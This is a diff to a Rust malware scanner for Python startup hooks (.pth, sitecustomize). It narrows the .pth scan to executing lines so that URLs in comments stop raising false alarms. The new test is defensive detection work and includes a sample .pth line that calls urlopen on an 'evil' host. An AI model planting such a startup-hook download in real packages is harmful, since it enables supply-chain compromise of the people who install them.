@@ -660,7 +660,28 @@ pub fn analyze_body(
     kind: StartupHookKind,
 ) -> StartupHookAnalysis {
     let lines = analyze_lines(body);
-    let capabilities = scan_capabilities(body);
+    // A `sitecustomize`/`usercustomize` module and a `.start` entry point run in FULL, so
+    // their whole body is the capability haystack. A plain `.pth`, however, executes ONLY
+    // its `import`-prefixed lines - CPython never runs comment or path-add lines - so
+    // scanning the whole body would false-positive (a URL in a `# comment`, or a
+    // NETWORK_TOKENS substring inside a path-add entry, would spuriously set `network`
+    // and fire PthNetworkDownload -> Block on a benign editable install). For a `.pth`,
+    // restrict the haystack to the executing (and malformed import-prefixed) lines.
+    let module_always_executes = matches!(
+        kind,
+        StartupHookKind::SiteCustomize | StartupHookKind::Start
+    );
+    let capabilities = if module_always_executes {
+        scan_capabilities(body)
+    } else {
+        let executing = lines
+            .iter()
+            .filter(|l| l.class.executes() || l.class == PthLineClass::Malformed)
+            .map(|l| l.text.as_str())
+            .collect::<Vec<_>>()
+            .join("\n");
+        scan_capabilities(&executing)
+    };
     let all_benign_templates = body_is_all_benign_templates(&lines);
     let mut signals: Vec<ArtifactSignal> = Vec::new();
 
@@ -726,10 +747,6 @@ pub fn analyze_body(
     // both, if the body carries a capability but produced no per-line executable
     // signal, record a body-level executable signal so correlation sees it. A
     // plain `.pth` is excluded: only its `import`-prefixed lines execute.
-    let module_always_executes = matches!(
-        kind,
-        StartupHookKind::SiteCustomize | StartupHookKind::Start
-    );
     let has_line_exec_signal = signals
         .iter()
         .any(|s| s.kind == ArtifactSignalKind::PthExecutableLine);
@@ -1096,6 +1113,28 @@ mod tests {
         assert!(kinds.contains(&ArtifactSignalKind::PthExecutableLine));
         assert!(kinds.contains(&ArtifactSignalKind::PthSubprocessSpawn));
         assert!(kinds.contains(&ArtifactSignalKind::PthNetworkDownload));
+    }
+
+    #[test]
+    fn pth_url_in_comment_does_not_fire_network() {
+        // A benign editable install: a URL in a COMMENT (never executed by CPython) plus an
+        // ordinary import line. The whole-body scan used to read the comment's URL and fire
+        // PthNetworkDownload -> a Block on a benign package. Only the executing lines form
+        // a `.pth`'s capability haystack.
+        let body = "# See: https://github.com/author/mypkg\nimport mypkg\n";
+        let analysis = analyze_body(body, &loc(), StartupHookKind::Pth);
+        assert!(
+            !distinct_kinds(&analysis.signals).contains(&ArtifactSignalKind::PthNetworkDownload),
+            "a URL in a .pth comment must not fire a network signal; got {:?}",
+            analysis.signals
+        );
+        // The genuine case still fires: a network op on an EXECUTING line.
+        let body2 = "import urllib.request; urllib.request.urlopen('http://evil/x')\n";
+        assert!(
+            distinct_kinds(&analyze_body(body2, &loc(), StartupHookKind::Pth).signals)
+                .contains(&ArtifactSignalKind::PthNetworkDownload),
+            "an executing network op must still fire"
+        );
     }
 
     #[test]
